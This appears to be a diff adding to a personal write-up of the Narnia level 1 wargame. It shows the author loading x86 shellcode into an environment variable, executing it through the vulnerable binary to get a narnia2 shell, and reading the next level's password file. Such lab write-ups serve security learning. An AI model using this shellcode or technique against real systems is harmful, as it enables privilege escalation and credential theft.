@@ -48,3 +48,34 @@ Now I have 2 options as far as I can tell before I start debugging:
 1) Test if seg fault occurs with EGG set to whoami's absolute path
 2) Test if seg fault occurs with EGG contains shell code
 
+After giving it some thought I don't think the absolute path is going to work because it seems that all strings will make ret() seg fault
+
+
+====================SHELLCODE========================================================
+narnia1@melinda:~$ uname -a
+Linux melinda 4.9.15-x86_64-linode81 #1 SMP Fri Mar 17 09:47:36 EDT 2017 x86_64 x86_64 x86_64 GNU/Linux
+
+There's a chunk of shellcode for c here https://www.exploit-db.com/exploits/41630/
+
+narnia1@melinda:~$ export EGG=\\xeb\\x10\\x5e\\x31\\xc9\\xb1\\x15\\x8a\\x06\\x34\\xe9\\x88\\x06\\x46\\xe2\\xf7\\xeb\\x05\\xe8\\xeb\\xff\\xff\\xff\\xd8\\x20\\xb8\\x81\\xc6\\xc6\\x9a\\x81\\x81\\xc6\\x8b\\x80\\x87\\x60\\x0a\\x83\\xe2\\xb1\\x70\\x24\\x69
+narnia1@melinda:~$ env
+[....stuff....]
+EGG=\xeb\x10\x5e\x31\xc9\xb1\x15\x8a\x06\x34\xe9\x88\x06\x46\xe2\xf7\xeb\x05\xe8\xeb\xff\xff\xff\xd8\x20\xb8\x81\xc6\xc6\x9a\x81\x81\xc6\x8b\x80\x87\x60\x0a\x83\xe2\xb1\x70\x24\x69
+[....stuff....]
+narnia1@melinda:~$ /narnia/narnia1
+Trying to execute EGG!
+Segmentation fault
+
+Derp don't want a string to be fed to getenv()
+
+narnia1@melinda:~$ export EGG=$(python -c'print "\xeb\x10\x5e\x31\xc9\xb1\x15\x8a\x06\x34\xe9\x88\x06\x46\xe2\xf7\xeb\x05\xe8\xeb\xff\xff\xff\xd8\x20\xb8\x81\xc6\xc6\x9a\x81\x81\xc6\x8b\x80\x87\x60\x0a\x83\xe2\xb1\x70\x24\x69"')
+narnia1@melinda:~$ echo $EGG
+�^1ɱ�4��F��������� ���ƚ��Ƌ��` ���p$i
+narnia1@melinda:~$ /narnia/narnia1
+Trying to execute EGG!
+$ whoami
+narnia2
+$ cat /etc/narnia_pass/narnia2
+[REDACTED]
+
+We didn't even have to debug! YAAAAAAAAAAAAAAAAYYYYYYYYYY
